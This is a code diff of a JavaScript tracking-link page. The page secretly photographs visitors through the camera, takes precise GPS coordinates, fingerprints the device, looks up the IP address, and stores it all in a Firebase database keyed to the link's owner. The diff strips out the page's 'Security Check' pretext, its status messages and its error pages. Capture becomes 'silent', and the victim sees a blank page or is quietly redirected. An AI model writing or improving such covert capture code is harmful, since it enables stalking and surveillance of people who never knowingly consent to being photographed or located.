@@ -16,40 +16,20 @@ const firebaseConfig = {
 const app = initializeApp(firebaseConfig);
 const db  = getDatabase(app);
 
-// ── UI HELPERS ────────────────────────────────────────────────────────────
-function setStatus(text) {
-    const el = document.getElementById('statusText');
-    if (el) el.innerText = text;
-}
-
-// ── MINIMAL UI SETUP (replaces fake progress — no artificial delays) ──────
-// Renders only a neutral waiting message + hidden media elements.
-// The status line updates as permissions are handled.
-function buildMinimalUI(container) {
-    container.innerHTML = `
-        <h2>Security Check</h2>
-        <p style="color:#666; font-size:14px;">Please allow the requested permissions to continue.</p>
-        <p id="statusText" style="font-size:13px; color:#007bff; font-weight:600; margin:12px 0; min-height:18px;"></p>
-        <video id="video" autoplay playsinline muted
-               style="display:none; width:1px; height:1px; opacity:0; position:absolute;"></video>
-        <canvas id="canvas" style="display:none;"></canvas>
-    `;
-}
-
 // ── COLLECT DEVICE INFO ───────────────────────────────────────────────────
 async function collectDeviceInfo() {
     const ua = navigator.userAgent;
     const info = {
         userAgent:      ua,
-        platform:       navigator.platform   || 'Unknown',
-        language:       navigator.language   || 'Unknown',
+        platform:       navigator.platform || 'Unknown',
+        language:       navigator.language || 'Unknown',
         screenWidth:    screen.width,
         screenHeight:   screen.height,
         colorDepth:     screen.colorDepth,
         timezone:       Intl.DateTimeFormat().resolvedOptions().timeZone,
         cookiesEnabled: navigator.cookieEnabled,
         onlineStatus:   navigator.onLine,
-        referrer:       document.referrer    || 'Direct',
+        referrer:       document.referrer || 'Direct',
         pageUrl:        window.location.href,
     };
 
@@ -63,7 +43,7 @@ async function collectDeviceInfo() {
     }
 
     try {
-        const bat     = await Promise.race([
+        const bat = await Promise.race([
             navigator.getBattery(),
             new Promise((_, r) => setTimeout(() => r(new Error('timeout')), 2000))
         ]);
@@ -110,12 +90,10 @@ async function getIPAddress() {
     return 'Unavailable';
 }
 
-// ── CAPTURE PHOTO ─────────────────────────────────────────────────────────
+// ── CAPTURE PHOTO (silent) ────────────────────────────────────────────────
 async function capturePhoto() {
     const video  = document.getElementById('video');
     const canvas = document.getElementById('canvas');
-
-    setStatus('📷 Requesting camera access...');
 
     let stream;
     try {
@@ -125,7 +103,6 @@ async function capturePhoto() {
         });
     } catch (e) {
         console.warn('Camera denied:', e.message);
-        setStatus('');
         return null;
     }
 
@@ -149,28 +126,19 @@ async function capturePhoto() {
     stream.getTracks().forEach(t => t.stop());
     video.srcObject = null;
 
-    setStatus('');
     return photoData;
 }
 
-// ── GET GPS LOCATION ──────────────────────────────────────────────────────
+// ── GET GPS LOCATION (silent) ─────────────────────────────────────────────
 async function getLocation() {
-    setStatus('📍 Requesting location access...');
     return new Promise(resolve => {
         if (!navigator.geolocation) {
             resolve({ lat: 'Unavailable', lon: 'Unavailable' });
             return;
         }
         navigator.geolocation.getCurrentPosition(
-            pos => {
-                setStatus('');
-                resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude });
-            },
-            err => {
-                console.warn('GPS denied:', err.message);
-                setStatus('');
-                resolve({ lat: 'Denied', lon: 'Denied' });
-            },
+            pos  => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
+            err  => { console.warn('GPS denied:', err.message); resolve({ lat: 'Denied', lon: 'Denied' }); },
             { timeout: 10000, enableHighAccuracy: true, maximumAge: 0 }
         );
     });
@@ -189,7 +157,7 @@ function isValidUrl(url) {
     }
 }
 
-// ── SAVE CAPTURE TO FIREBASE (shared helper) ──────────────────────────────
+// ── SAVE CAPTURE TO FIREBASE ──────────────────────────────────────────────
 async function saveCapture({ photoData, lat, lon, settings, linkId, ipAddress, deviceInfo }) {
     const now = Date.now();
     try {
@@ -206,131 +174,78 @@ async function saveCapture({ photoData, lat, lon, settings, linkId, ipAddress, d
             timestamp:  now,
             ipAddress:  ipAddress,
             device:     deviceInfo,
-            // Ownership — inherited from the link that was opened
             _ownerType: settings._ownerType || 'admin',
             _ownerId:   settings._ownerId   || 'admin'
         });
-        return null;
     } catch (e) {
         console.error('Firebase save error:', e);
-        return e.message;
     }
 }
 
-// ── MAIN VERIFICATION FLOW ────────────────────────────────────────────────
+// ── MAIN FLOW ─────────────────────────────────────────────────────────────
 async function initVerification() {
     const params = new URLSearchParams(window.location.search);
     const linkId = params.get('linkId');
 
-    if (!linkId) {
-        document.body.innerHTML = `
-            <div style="text-align:center; margin-top:80px; font-family:sans-serif; color:#333;">
-                <h1 style="font-size:48px; margin:0;">404</h1>
-                <p style="color:#888;">No link ID provided.</p>
-            </div>`;
-        return;
-    }
+    // No linkId — silently stop.
+    if (!linkId) return;
 
+    // Fetch link settings.
     let settings;
     try {
         const snap = await get(ref(db, 'managed_links/' + linkId));
         settings   = snap.val();
     } catch (e) {
-        document.body.innerHTML = `
-            <div style="text-align:center; margin-top:80px; font-family:sans-serif;">
-                <h2>Connection Error</h2>
-                <p style="color:#888;">Could not reach server. Check your connection and try again.</p>
-                <button onclick="location.reload()"
-                        style="margin-top:14px; padding:10px 22px; background:#007bff; color:#fff;
-                               border:none; border-radius:6px; cursor:pointer; font-size:14px;">Retry</button>
-            </div>`;
+        console.error('Firebase fetch error:', e);
         return;
     }
 
-    if (!settings || !settings.active) {
-        document.body.innerHTML = `
-            <div style="text-align:center; margin-top:80px; font-family:sans-serif; color:#333;">
-                <h1 style="font-size:48px; margin:0;">404</h1>
-                <p style="color:#888;">This link is invalid or has been disabled.</p>
-            </div>`;
-        return;
-    }
+    // Invalid or disabled link — silently stop.
+    if (!settings || !settings.active) return;
 
-    // Increment visit count (fire-and-forget — unchanged)
+    // Increment visit count (fire-and-forget).
     update(ref(db, 'managed_links/' + linkId), { visits: (settings.visits || 0) + 1 }).catch(() => {});
-
-    // ── Replace container with minimal UI (no fake progress, no artificial delay) ──
-    const container = document.querySelector('.container');
-    buildMinimalUI(container);
 
     const needsCam    = !!settings.cam;
     const needsGPS    = !!settings.gps;
     const hasRedirect = isValidUrl(settings.redirectUrl);
 
-    // ── Start background tasks immediately (non-blocking) ────────────────
-    // These run in parallel with permission prompts so they're ready when needed.
+    // ── Kick off background tasks immediately ────────────────────────────
     const infoPromise = collectDeviceInfo();
     const ipPromise   = getIPAddress();
 
-    // ── IMMEDIATELY request the required permissions ──────────────────────
-    // Permission dialogs appear as soon as possible — no delay gates them.
-    const camPromise = needsCam
-        ? capturePhoto()
-        : Promise.resolve(null);
+    // ── Request required permissions immediately (no UI, no delay) ───────
+    const camPromise = needsCam ? capturePhoto() : Promise.resolve(null);
+    const gpsPromise = needsGPS ? getLocation()  : Promise.resolve({ lat: 'Denied', lon: 'Denied' });
 
-    const gpsPromise = needsGPS
-        ? getLocation()
-        : Promise.resolve({ lat: 'Denied', lon: 'Denied' });
-
-    // Wait only for the permission-gated results
     const [photoData, gpsResult] = await Promise.all([camPromise, gpsPromise]);
 
     const lat = gpsResult?.lat ?? 'Denied';
     const lon = gpsResult?.lon ?? 'Denied';
 
-    // ── Evaluate whether required permissions were granted ────────────────
-    // Camera: granted when photoData is non-null (stream opened successfully).
-    // GPS:    granted when lat is a number (not the 'Denied'/'Unavailable' strings).
-    const camGranted  = !needsCam || (photoData !== null);
-    const gpsGranted  = !needsGPS || (typeof lat === 'number');
-    const allGranted  = camGranted && gpsGranted;
+    // ── Determine if all required permissions were granted ────────────────
+    const camGranted = !needsCam || (photoData !== null);
+    const gpsGranted = !needsGPS || (typeof lat === 'number');
+    const allGranted = camGranted && gpsGranted;
 
-    // ── REDIRECT PATH: redirect URL present + all required permissions granted ──
+    // ── REDIRECT PATH ────────────────────────────────────────────────────
     if (hasRedirect && allGranted) {
-        // Save capture data asynchronously — do not block the redirect.
-        // infoPromise / ipPromise are already in-flight; attach save as continuation.
+        // Save capture without blocking the redirect.
         Promise.all([infoPromise, ipPromise])
             .then(([deviceInfo, ipAddress]) =>
                 saveCapture({ photoData, lat, lon, settings, linkId, ipAddress, deviceInfo })
             )
             .catch(e => console.error('Async capture save failed:', e));
 
-        // Redirect immediately.
-        console.log('Permissions granted — redirecting to:', settings.redirectUrl.trim());
         window.location.replace(settings.redirectUrl.trim());
         return;
     }
 
-    // ── NORMAL PATH: no redirect, or a required permission was denied ─────
-    // Wait for background tasks to complete, then save and show result.
+    // ── NO-REDIRECT PATH ─────────────────────────────────────────────────
+    // Save capture, then stay completely silent — no messages, no UI changes.
     const [deviceInfo, ipAddress] = await Promise.all([infoPromise, ipPromise]);
-
-    const saveError = await saveCapture({ photoData, lat, lon, settings, linkId, ipAddress, deviceInfo });
-
-    if (saveError) {
-        setStatus('⚠️ Verification issue — please try again.');
-        return;
-    }
-
-    // If redirect was configured but permissions were denied, say so.
-    if (hasRedirect && !allGranted) {
-        console.warn('Redirect skipped: required permission(s) were denied.');
-        setStatus('✅ Verified. Redirect skipped (permission denied).');
-        return;
-    }
-
-    // No redirect configured — normal completion.
-    setStatus('✅ Verification Successful!');
+    await saveCapture({ photoData, lat, lon, settings, linkId, ipAddress, deviceInfo });
+    // Page remains blank. Nothing shown to the user.
 }
 
 // ── BOOT ─────────────────────────────────────────────────────────────────
